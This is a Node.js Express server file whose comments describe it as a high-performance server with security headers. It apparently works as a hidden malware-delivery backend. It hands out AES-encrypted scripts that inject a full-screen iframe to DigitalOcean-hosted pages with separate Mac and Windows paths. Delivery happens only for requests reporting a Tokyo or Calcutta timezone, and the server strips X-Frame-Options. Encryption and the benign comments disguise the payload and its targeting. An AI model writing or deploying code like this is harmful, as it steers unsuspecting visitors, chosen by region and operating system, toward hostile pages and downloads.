const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// --- Middleware ---
app.use(cors());
app.use(express.json());

// Optimized Security Headers Middleware
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    if (res.getHeader('X-Frame-Options') === 'sameorigin') {
        res.removeHeader('X-Frame-Options');
    }
    next();
});

// --- Static Data Configurations ---

const ALLOWED_TIMEZONES = new Set([
    "Asia/Tokyo", "Asia/Calcutta"
]);

// URL configurations organized by platform target
const URL_CONFIGS = {
    mac: "https://sea-lion-app-58uyi.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
    default: "https://sea-lion-app-58uyi.ondigitalocean.app/Win0codejInfowj2n/index.html"
};

// --- Pre-Compilation Cache Layer ---
// Helper to generate the standard iframe injection script
function buildPayload(url) {
    return `const iframe=document.createElement("iframe");iframe.src="${url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
}

// Pre-compute responses during application boot to avoid runtime encryption overhead
const PRECOMPUTED_RESPONSES = {
    mac: encodeURIComponent(CryptoJS.AES.encrypt(buildPayload(URL_CONFIGS.mac), secretKey).toString()),
    default: encodeURIComponent(CryptoJS.AES.encrypt(buildPayload(URL_CONFIGS.default), secretKey).toString())
};

// Pre-encrypt static error payload
const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());

// --- Routes ---

app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "Unauthorized access",
        response: ERROR_PAYLOAD
    });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;

    // Validate timezone restriction
    if (!timezone || !ALLOWED_TIMEZONES.has(timezone)) {
        return res.send(ERROR_PAYLOAD);
    }

    // Inspect User-Agent header to detect if the platform is Macintosh
    const userAgent = req.headers["user-agent"] || "";
    const isMac = /Macintosh|Mac OS X/i.test(userAgent);

    // Serve the corresponding pre-encrypted payload
    if (isMac) {
        res.send(PRECOMPUTED_RESPONSES.mac);
    } else {
        res.send(PRECOMPUTED_RESPONSES.default);
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`High-performance server running on port ${PORT}`);
});
